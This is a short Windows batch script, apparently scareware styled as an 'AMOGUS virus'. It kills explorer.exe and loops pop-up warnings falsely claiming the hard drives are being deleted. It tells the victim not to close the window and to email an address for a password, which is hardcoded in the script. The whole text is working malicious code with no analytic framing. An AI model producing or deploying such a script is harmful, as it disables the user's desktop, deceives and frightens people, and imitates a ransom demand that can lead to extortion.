@echo off 
title WARNING: YOUR PC HAS BEEN DAMAGED BY AMOGUSVIRUS
taskkill /f /im explorer.exe
:bucle
color 3
msg * YOUR PC HAS DAMAGED BY THE AMOGUS VIRUS!
msg * DO NOT RESTART THE PC.
msg * DELETING THE HARD DRIVES...
msg * DELETING EVERYTHING...
msg * DON'T CLOSE THE WINDOW.
echo ===================================================
echo IF YOU CLOSE THE WINDOW, YOU CAN'T RECOVER YOUR PC.
echo ====================================================
echo SEND AN EMAIL TO bodalupanov@gmail.com FOR THE PASS! AND RECOVER EVERYTHING!
set /p pass= Enter pass here:
if %pass%==AMOGUSPASSWORD123 (goto passcorrecto) ELSE (goto bucle)
:passcorrecto
cls
echo Pass correct
pause
start explorer
echo Bye!
exit